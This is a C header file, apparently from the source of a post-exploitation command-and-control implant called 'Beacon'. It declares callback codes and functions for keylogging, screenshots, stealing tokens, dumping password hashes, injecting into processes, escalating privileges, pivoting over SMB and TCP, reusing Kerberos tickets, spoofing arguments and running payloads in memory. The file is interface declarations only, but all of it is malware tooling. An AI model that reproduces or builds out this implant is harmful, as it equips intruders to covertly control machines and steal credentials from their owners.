#define CALLBACK_OUTPUT       0x00
#define CALLBACK_KEYSTROKES   0x01
#define CALLBACK_FILE         0x02
#define CALLBACK_SCREENSHOT   0x03
#define CALLBACK_CLOSE        0x04
#define CALLBACK_READ         0x05
#define CALLBACK_CONNECT      0x06
#define CALLBACK_PING         0x07
#define CALLBACK_FILE_WRITE   0x08
#define CALLBACK_FILE_CLOSE   0x09
#define CALLBACK_PIPE_OPEN    0x0a
#define CALLBACK_PIPE_CLOSE   0x0b
#define CALLBACK_PIPE_READ    0x0c
#define CALLBACK_POST_ERROR   0x0d
#define CALLBACK_PIPE_PING    0x0e
#define CALLBACK_TOKEN_STOLEN 0x0f
#define CALLBACK_TOKEN_GETUID 0x10
#define CALLBACK_PROCESS_LIST 0x11
#define CALLBACK_POST_REPLAY_ERROR 0x12
#define CALLBACK_PWD          0x13
#define CALLBACK_JOBS         0x14
#define CALLBACK_HASHDUMP     0x15
#define CALLBACK_PENDING      0x16
#define CALLBACK_ACCEPT       0x17
#define CALLBACK_NETVIEW      0x18
#define CALLBACK_PORTSCAN     0x19
#define CALLBACK_DEAD         0x1a
#define CALLBACK_SSH_STATUS   0x1b
#define CALLBACK_CHUNK_ALLOCATE 0x1c
#define CALLBACK_CHUNK_SEND     0x1d
#define CALLBACK_OUTPUT_OEM     0x1e
#define CALLBACK_ERROR          0x1f
#define CALLBACK_OUTPUT_UTF8    0x20

/* read modes */
#define JOB_MODE_BYTE          0x0
#define JOB_MODE_MESSAGE       0x1

/* c2 options */
#define POST_DNS              0x0
#define POST_HTTP             0x1
#define POST_SMB              0x2
#define POST_TCP              0x3

/* for file downloads */
#define MAX_PACKET 524288

/* for file downloads over DNS */
#define MAX_PACKET_DNS 4096

void command_blockdlls(char * buffer, int length);
void command_die(void(*cb)(char * buffer, int length, int type));
void command_sleep(char * buffer, int length);
void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken);
void command_inject_ping(char * buffer, int length, BOOL x86, void (*cb)(char * buffer, int length, int type));
void command_inject_pid(char * buffer, int length, BOOL x86);
void command_spawnas(char * buffer, int length, BOOL x86);
void command_spawnu(char * buffer, int length, BOOL x86);
void command_dll_load(char * buffer, int length);
void command_cd(char * buffer, int length);
void command_execjob(char * buffer, int length);
void command_upload(char * buffer, int length, char * mode);
void command_execute(char * buffer, int length);
void command_spawnproc(char * buffer, int length, BOOL x86);
void command_runas(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_runu(char * buffer, int length);
void command_pwd(void(*callback)(char * buffer, int length, int type));
void command_pause(char * buffer, int length);
void command_ipconfig(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_loginuser(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_stage_payload(char * buffer, int length);
void command_stage_payload_smb(char * buffer, int length);
void command_setenv(char * buffer, int length);
void command_ppid(char * buffer, int length);
void command_inject_pid_ping(char * buffer, int length, void(*callback)(char * buffer, int length, int type), BOOL x86);
void command_reg_query(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_elevate_run_inject(BOOL x86, char * buffer, int length);

/* job API */
void command_job_register(char * buffer, int length, BOOL impersonate, short mode);
void command_jobs(void(*callback)(char * buffer, int length, int type));
void command_job_kill(char * buffer, int length);

/* this is a very complicated job to spawn, inject, and register a job */
void command_job_spawn(char * buffer, int length, BOOL x86, BOOL ignoreToken);

/* spawn our temporary process */
BOOL spawn_patsy(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi);

/* spawn our temporary process as another user */
BOOL spawn_patsy_as(BOOL x86, char * domain, char * user, char * pass, PROCESS_INFORMATION * pi);

/* spawn+inject for spawn_patsy_u */
BOOL spawn_patsy_u(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD ppid);

/* generic mechanism to populate our spawn command */
void spawn_populate(BOOL x86, char * cmdbuff);

/* download related commands */
void command_download(char * buffer, int length, void (*cb)(char * buffer, int length, int type));
void command_download_stop(char * buffer, int length);

/* token related commands */
void command_getuid(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_rev2self();
void command_steal_token(char * buffer, int length, void (*callback)(char * buffer, int length, int type));

/* privilege escalation commands */
void command_getsystem(char * buffer, int length);
void command_elevate_pre(char * buffer, int length);
void command_elevate_post(void(*callback)(char * buffer, int length, int type));
void command_getprivs(char * buffer, int length, void(*callback)(char * buffer, int length, int type));

/* pivot related commands */
void command_connect(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_close(char * buffer, int length);
void command_send(char * buffer, int length);
void command_listen(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_socket_bind(char * buffer, int length, DWORD bindto);
void command_socket_close(char * buffer, int length);
void command_socket_tcppivot(char * buffer, int length);

void pivot_poll(void (*cb)(char * buffer, int length, int type));
void download_poll(void (*cb)(char * buffer, int length, int type), int max);
void token_report(void (*cb)(char * buffer, int length, int type));
void psh_poll(void (*callback)(char * buffer, int length, int type), int max);

/* linking and message routing stuff */
void command_link_wait();
void command_link_start(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_link_start_explicit(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_link_stop(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_link_route(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_link_reopen(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_tcp_connect(char * buffer, int length, void(*callback)(char * buffer, int length, int type));

/* process related commands */
void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_ps_kill(char * buffer, int length);

/* file system related commands */
void command_file_list(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_file_mkdir(char * buffer, int length);
void command_file_drives(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
void command_file_delete(char * buffer, int length);
void command_file_copy(char * buffer, int length);
void command_file_move(char * buffer, int length);

/* argument spoofing commands */
void command_argue_add(char * buffer, int length);
void command_argue_remove(char * buffer, int length);
void command_argue_list(void(*callback)(char * buffer, int length, int type));

/* kerberos related commands */
void command_kerberos_ticket_purge();
void command_kerberos_ticket_use(char * buffer, int length);

/* powershell related commands */
void command_psh_import(char * buffer, int length);
void command_psh_host_tcp(char * buffer, int length);
void command_webserver_local(char * buffer, int length);

/* inline execute mechanism... *pHEAR* */
void command_inline_execute(char * buffer, int length);
void command_inline_execute_object(char * buffer, int length);

/* generic mechanism for this */
BOOL inline_execute(char * payload, DWORD plength, char * arg, DWORD alength);

/* shared utility functions */
BOOL is_admin();
BOOL is_wow64(HANDLE handle);
BOOL is_x64();					/* are we in an x64 Beacon? */
BOOL is_vista_or_later();
BOOL token_user(HANDLE token, char * buffer, int length);
BOOL execute_program_with_ppid(char * cbuffer, int clen, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD flags, BOOL ignoreToken, int ppid);
BOOL execute_program_with_default_ppid(char * cbuffer, int clen, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD flags, BOOL ignoreToken);
BOOL is_x64_process(HANDLE process);
DWORD env_expand(char * src, char * dst, DWORD maxdst);
BOOL check_kill_date();
BOOL bad_watermark();
BOOL bad_watermarkHash();
void agent_init(char * buffer, DWORD max);
void cleanupProcess(PROCESS_INFORMATION * pi);
BOOL use_token(HANDLE token, char * name, DWORD nlen);

/* file recursion functions */
typedef void(*RCALLBACK)(char * parent, char * file, BOOL folder);
void recurse(char * start, RCALLBACK callback);

BOOL toWideChar(char * src, wchar_t * dst, int max);

/* a safe way to start threads */
HANDLE run_thread_start(void(*function)(void *), LPVOID args);

/* a safe way to exit this process */
void safe_exit();

/* stuff for sending output */
char * command_shell_encrypt(char * buffer, int length, int type, DWORD * result_len);
void command_shell_chunk_maybe(char * buffer, int blength, int type);
void GargleSleep(DWORD time);

/* alternate credentials data structure */
typedef struct {
	wchar_t * domain;
	wchar_t * user;
	wchar_t * password;
	void    * manager;
	BOOL      active;
} ALTCREDS;